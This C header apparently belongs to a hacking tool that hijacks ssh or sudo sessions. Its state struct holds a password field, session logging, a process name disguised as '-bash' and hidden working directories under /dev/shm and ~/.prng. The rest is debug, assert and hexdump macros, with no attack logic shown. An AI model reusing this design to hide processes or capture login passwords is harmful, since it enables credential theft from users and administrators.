#ifdef HAVE_CONFIG_H
# include <config.h>
#endif
#include <sys/types.h>
#include <sys/socket.h>
#include <sys/stat.h>
#include <sys/select.h>
#include <sys/wait.h>
#include <sys/time.h>
#include <sys/ioctl.h>
#include <stdarg.h>
#include <time.h>
#include <fcntl.h>
#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <stdbool.h>
#ifdef HAVE_UNISTD_H
# include <unistd.h>
#endif
#include <getopt.h>
#include <string.h>
#include <signal.h>
#include <errno.h>
#include <termios.h>
#ifdef HAVE_UTIL_H
# include <util.h>
#endif
#ifdef HAVE_PTY_H
# include <pty.h>
#endif
#include "utils.h"


extern FILE *g_dbg_fp;

struct _g
{
	char *db_basedir;      // /dev/shm/.../`
	char *basedir_local;   // /home/user/.prng/
	char *basedir_rel;     // ".prng" or /dev/shm/.prng
	char *target_file;     // /usr/bin/ssh
	char *target_name;     // 'ssh' or 'sudo'
	char *ps_name;  // '-bash'
	int recheck_time;
	char *destination;
	char *password;
	bool is_sessionlog;
	char *sessionlog_file;
	bool is_debug;
	bool is_path_redirect;

	int port;
	char *host;
	char *login_name;
	char *keyfile;
	char ssh_param[8196];   // The original args 
	char *ssh_destination;
	int fd_log;
	LNBUF ln_pty;
	LNBUF ln_in;
};

#define xfprintf(fp, a...) do {if (fp != NULL) { fprintf(fp, a); fflush(fp); } } while (0)

#ifndef MAX
# define MAX(X, Y) (((X) < (Y)) ? (Y) : (X))
#endif

#ifndef MIN
# define MIN(X, Y) (((X) < (Y)) ? (X) : (Y))
#endif

#define D_RED(a)	"\033[0;31m"a"\033[0m"
#define D_GRE(a)	"\033[0;32m"a"\033[0m"
#define D_YEL(a)	"\033[0;33m"a"\033[0m"
#define D_BLU(a)	"\033[0;34m"a"\033[0m"
#define D_MAG(a)	"\033[0;35m"a"\033[0m"
#define D_BRED(a)	"\033[1;31m"a"\033[0m"
#define D_BGRE(a)	"\033[1;32m"a"\033[0m"
#define D_BYEL(a)	"\033[1;33m"a"\033[0m"
#define D_BBLU(a)	"\033[1;34m"a"\033[0m"
#define D_BMAG(a)	"\033[1;35m"a"\033[0m"
#ifdef DEBUG
# define DEBUGF(a...)   do{ xfprintf(g_dbg_fp, "DEBUG-%d: ", __LINE__); xfprintf(g_dbg_fp, a); }while(0)
# define DEBUGF_R(a...) do{ xfprintf(g_dbg_fp, "DEBUG-%d: ", __LINE__); xfprintf(g_dbg_fp, "\033[1;31m"); xfprintf(g_dbg_fp, a); xfprintf(g_dbg_fp, "\033[0m"); }while(0)
# define DEBUGF_G(a...) do{ xfprintf(g_dbg_fp, "DEBUG-%d: ", __LINE__); xfprintf(g_dbg_fp, "\033[1;32m"); xfprintf(g_dbg_fp, a); xfprintf(g_dbg_fp, "\033[0m"); }while(0)
# define DEBUGF_B(a...) do{ xfprintf(g_dbg_fp, "DEBUG-%d: ", __LINE__); xfprintf(g_dbg_fp, "\033[1;34m"); xfprintf(g_dbg_fp, a); xfprintf(g_dbg_fp, "\033[0m"); }while(0)
# define DEBUGF_Y(a...) do{ xfprintf(g_dbg_fp, "DEBUG-%d: ", __LINE__); xfprintf(g_dbg_fp, "\033[1;33m"); xfprintf(g_dbg_fp, a); xfprintf(g_dbg_fp, "\033[0m"); }while(0)
# define DEBUGF_M(a...) do{ xfprintf(g_dbg_fp, "DEBUG-%d: ", __LINE__); xfprintf(g_dbg_fp, "\033[1;35m"); xfprintf(g_dbg_fp, a); xfprintf(g_dbg_fp, "\033[0m"); }while(0)
# define DEBUGF_C(a...) do{ xfprintf(g_dbg_fp, "DEBUG-%d: ", __LINE__); xfprintf(g_dbg_fp, "\033[1;36m"); xfprintf(g_dbg_fp, a); xfprintf(g_dbg_fp, "\033[0m"); }while(0)
# define DEBUGF_W(a...) do{ xfprintf(g_dbg_fp, "DEBUG-%d: ", __LINE__); xfprintf(g_dbg_fp, "\033[1;37m"); xfprintf(g_dbg_fp, a); xfprintf(g_dbg_fp, "\033[0m"); }while(0)
# define DEBUG_SETID(xgs)    gs_did = (xgs)->fd
#else
# define DEBUGF(a...)
# define DEBUGF_R(a...)
# define DEBUGF_G(a...)
# define DEBUGF_B(a...)
# define DEBUGF_Y(a...)
# define DEBUGF_M(a...)
# define DEBUGF_C(a...)
# define DEBUGF_W(a...)
# define DEBUG_SETID(xgs)
#endif

#define THC_TV_TO_USEC(tv)               ((uint64_t)(tv)->tv_sec * 1000000 + (tv)->tv_usec)
#define THC_SEC_TO_USEC(sec)             ((uint64_t)(sec) * 1000000)
#define THC_USEC_TO_TV(tv, usec)         do { (tv)->tv_sec = (usec) / 1000000; (tv)->tv_usec = (usec) % 1000000; } while(0)

#ifndef XASSERT
# define XASSERT(expr, a...) do { \
	if (!(expr)) { \
		xfprintf(g_dbg_fp, "%s:%d:%s() ASSERT(%s) ", __FILE__, __LINE__, __func__, #expr); \
		xfprintf(g_dbg_fp, a); \
		xfprintf(g_dbg_fp, " Exiting...\n"); \
		exit(255); \
	} \
} while (0)
#endif

#define XCLOSE(xfd)           do{if (xfd < 0) break; close(xfd); xfd=-1;}while(0)
#define XFREE(_ptr)           do{if (_ptr==NULL) break; free(_ptr); _ptr=NULL;}while(0)
#define XFD_SET(_fd, _rfd)    do{if (_fd < 0) break; FD_SET(_fd, (_rfd));}while(0)
#define XFD_ISSET(_fd, _rfd)  (_fd)>=0?FD_ISSET((_fd), (_rfd)):0

#ifdef DEBUG
# define ERREXIT(a...)   do { \
	xfprintf(g_dbg_fp, "ERROR "); \
	xfprintf(g_dbg_fp, "%s():%d ", __func__, __LINE__); \
	xfprintf(g_dbg_fp, a); \
	exit(255); \
} while (0)
#else
# define ERREXIT(a...)   do { \
	xfprintf(g_dbg_fp, "ERROR: "); \
	xfprintf(g_dbg_fp, a); \
	exit(255); \
} while (0)
#endif

# define HEXDUMP(a, _len)        do { \
    size_t _n = 0; \
    xfprintf(g_dbg_fp, "%s:%d HEX[%zd] ", __FILE__, __LINE__, _len); \
    while (_n < (_len)) xfprintf(g_dbg_fp, "%2.2x", ((unsigned char *)a)[_n++]); \
    xfprintf(g_dbg_fp, "\n"); \
} while (0)
# define HEXDUMPF(a, len, m...) do{xfprintf(g_dbg_fp, m); HEXDUMP(a, len);}while(0)

